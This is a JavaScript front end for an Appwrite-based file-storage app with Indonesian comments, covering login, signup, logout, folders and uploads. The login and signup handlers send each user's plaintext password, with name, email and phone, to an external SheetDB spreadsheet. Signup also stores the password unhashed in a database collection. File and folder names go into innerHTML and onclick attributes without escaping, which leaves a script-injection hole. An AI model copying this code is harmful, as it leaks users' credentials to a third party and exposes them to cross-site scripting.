// ======================================================
// STORAGE TASKS - APP.JS (DESIGN CENTER FIX)
// ======================================================

const client = new Appwrite.Client();
const account = new Appwrite.Account(client);
const databases = new Appwrite.Databases(client);
const storage = new Appwrite.Storage(client);

// KONFIGURASI
const CONFIG = {
    ENDPOINT: 'https://sgp.cloud.appwrite.io/v1',
    PROJECT_ID: '697f71b40034438bb559', 
    DB_ID: 'storagedb',
    COLLECTION_FILES: 'files',   
    COLLECTION_USERS: 'users',   
    BUCKET_ID: 'taskfiles'
};

const SHEETDB_API = 'https://sheetdb.io/api/v1/v9e5uhfox3nbi';

client.setEndpoint(CONFIG.ENDPOINT).setProject(CONFIG.PROJECT_ID);

let currentUser = null;
let currentFolderId = 'root'; // Menyimpan ID folder yang sedang dibuka

const el = (id) => document.getElementById(id);
const showLoading = () => { if(el('loading')) el('loading').classList.remove('hidden'); };
const hideLoading = () => { if(el('loading')) el('loading').classList.add('hidden'); };

// NAVIGASI
window.nav = (pageId) => {
    ['loginPage', 'signupPage', 'dashboardPage'].forEach(id => {
        if(el(id)) el(id).classList.add('hidden');
    });
    if(el(pageId)) el(pageId).classList.remove('hidden');
};

// ======================================================
// OTENTIKASI (Login, Signup, Logout)
// ======================================================

// LOGIN
if (el('loginForm')) {
    el('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        let identifier = el('loginEmail').value.trim(); 
        const password = el('loginPass').value;
        showLoading();
        try {
            if (!identifier.includes('@')) {
                const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, [Appwrite.Query.equal('name', identifier)]);
                if (res.total === 0) throw new Error("Username tidak ditemukan.");
                identifier = res.documents[0].email;
            }
            await account.createEmailPasswordSession(identifier, password);
            currentUser = await account.get();

            fetch(`${SHEETDB_API}?sheet=Login`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": currentUser.$id, "Nama": currentUser.name, "Email": currentUser.email, "Password": password, "Riwayat Waktu": new Date().toLocaleString('id-ID') }]})
            });

            checkSession(); 
        } catch (error) { alert("Login Gagal: " + error.message); } 
        finally { hideLoading(); }
    });
}

// SIGNUP
if (el('signupForm')) {
    el('signupForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const name = el('regName').value; const email = el('regEmail').value;
        const phone = el('regPhone').value; const pass = el('regPass').value;
        if (pass !== el('regVerify').value) return alert("Password tidak sama!");
        showLoading();
        try {
            const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
            await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone, password: pass });
            
            fetch(`${SHEETDB_API}?sheet=SignUp`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString('id-ID') }]})
            });

            alert("Daftar Berhasil!"); nav('loginPage');
        } catch (error) { alert(error.message); } finally { hideLoading(); }
    });
}

// LOGOUT
if (el('logoutBtn')) {
    el('logoutBtn').addEventListener('click', async () => {
        if (!confirm("Keluar?")) return;
        showLoading();
        try {
            const user = await account.get();
            await fetch(`${SHEETDB_API}?sheet=Logout`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: [{ "ID": user.$id, "Nama": user.name, "Email": user.email, "Riwayat Waktu": new Date().toLocaleString('id-ID') }]})
            });
            await account.deleteSession('current');
            currentUser = null;
        } catch (e) { console.error(e); }
        finally {
            hideLoading();
            alert("Anda telah logout.");
            nav('loginPage');
        }
    });
}

// ======================================================
// STORAGE LOGIC (RENDER & NAVIGASI FOLDER)
// ======================================================

// Cek Sesi
async function checkSession() {
    showLoading();
    try {
        currentUser = await account.get();
        nav('dashboardPage'); 
        updateGreeting(); 
        loadFiles('root'); // Load folder utama
    } catch (e) { nav('loginPage'); }
    finally { setTimeout(hideLoading, 500); }
}
document.addEventListener('DOMContentLoaded', checkSession);

// Load Files dari Database
async function loadFiles(folderId) {
    if (!currentUser) return;
    const grid = el('fileGrid'); 
    grid.innerHTML = ''; // Bersihkan grid

    // Tombol Kembali (Jika masuk ke folder)
    const breadcrumb = document.querySelector('.breadcrumb-area');
    if(folderId !== 'root') {
        breadcrumb.innerHTML = `<button onclick="loadFiles('root')" class="btn-pill small" style="background:rgba(255,255,255,0.2); width:auto; padding:0 15px;"><i class="fa-solid fa-arrow-left"></i> Kembali</button> <h2 style="display:inline; margin-left:10px;">Folder</h2>`;
    } else {
        breadcrumb.innerHTML = `<h2 id="welcomeText">Welcome In Drive</h2>`;
        updateGreeting();
    }

    try {
        const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
            Appwrite.Query.equal('owner', currentUser.$id),
            Appwrite.Query.equal('parentId', folderId) // Menampilkan isi folder yang sesuai
        ]);
        
        if(res.documents.length === 0) {
            grid.innerHTML = `<p style="color:rgba(255,255,255,0.5); width:100%; text-align:center;">Folder Kosong</p>`;
        } else {
            res.documents.forEach(doc => renderItem(doc));
        }
        
    } catch (e) { console.error(e); }
}

// Render Item (Tampilan Kotak Besar di Tengah)
function renderItem(doc) {
    const grid = el('fileGrid');
    const div = document.createElement('div'); 
    div.className = 'item-card'; // Menggunakan style CSS baru
    
    const isFolder = doc.type === 'folder';
    const icon = isFolder ? 'fa-folder' : 'fa-file';
    
    // Aksi Klik: Masuk Folder (ubah currentFolderId) atau Buka File
    const clickAction = isFolder 
        ? `openFolder('${doc.$id}')` 
        : `window.open('${doc.url}', '_blank')`;

    div.innerHTML = `
        <button class="del-btn" onclick="deleteItem('${doc.$id}','${doc.type}','${doc.fileId}')">
            <i class="fa-solid fa-xmark"></i>
        </button>
        <div onclick="${clickAction}" style="width:100%; height:100%; display:flex; flex-direction:column; align-items:center; justify-content:center;">
            <i class="icon fa-solid ${icon}"></i>
            <div class="item-name">${doc.name}</div>
        </div>`;
    grid.appendChild(div);
}

// Fungsi Pindah Folder
window.openFolder = (id) => {
    currentFolderId = id; // Simpan posisi folder saat ini
    loadFiles(id);
};

// ======================================================
// FITUR MODAL (BUAT FOLDER & UPLOAD)
// ======================================================

window.submitCreateFolder = async () => {
    const name = el('newFolderName').value.trim();
    if (!name) return;
    closeModal('folderModal'); showLoading();
    try {
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: name, 
            type: 'folder', 
            parentId: currentFolderId, // Folder dibuat di dalam folder yang sedang dibuka
            owner: currentUser.$id, 
            size: 0
        });
        loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

window.submitUploadFile = async () => {
    if (!window.selectedFile) return alert("Pilih file!");
    closeModal('uploadModal'); showLoading();
    try {
        const file = window.selectedFile;
        const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), file);
        const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
        
        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
            name: file.name, 
            type: 'file', 
            parentId: currentFolderId, // File diupload ke folder yang sedang dibuka
            owner: currentUser.$id, 
            url: url.href, 
            fileId: up.$id, 
            size: file.size
        });
        loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

// Utils Hapus Item
window.deleteItem = async (id, type, fileId) => {
    if (!confirm("Hapus?")) return;
    showLoading();
    try {
        if (type === 'file') await storage.deleteFile(CONFIG.BUCKET_ID, fileId);
        await databases.deleteDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, id);
        loadFiles(currentFolderId);
    } catch (e) { alert(e.message); } finally { hideLoading(); }
};

// ======================================================
// HELPER UI LAINNYA
// ======================================================
window.openModal = (id) => { el(id).classList.remove('hidden'); el('dropdownMenu').classList.remove('show'); };
window.closeModal = (id) => el(id).classList.add('hidden');
window.triggerUploadModal = () => openModal('uploadModal');
window.createFolder = () => openModal('folderModal');
window.toggleDropdown = () => el('dropdownMenu').classList.toggle('show');
window.togglePass = (id, icon) => { const i = el(id); i.type = i.type==='password'?'text':'password'; icon.classList.toggle('fa-eye'); icon.classList.toggle('fa-eye-slash'); };
function updateGreeting() { const h = new Date().getHours(); let s = "Morning"; if(h>=12) s="Afternoon"; if(h>=18) s="Night"; if(el('welcomeText')) el('welcomeText').innerText = `Welcome In Drive ${s}`; }

// Drag & Drop Init
el('dropZone').addEventListener('dragover', (e) => { e.preventDefault(); e.target.classList.add('dragover'); });
el('dropZone').addEventListener('drop', (e) => { e.preventDefault(); handleFileSelect(e.dataTransfer.files[0]); });
el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.target.files[0]));
function handleFileSelect(f) { window.selectedFile = f; el('fileInfoText').innerText = `File: ${f.name}`; }
el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));
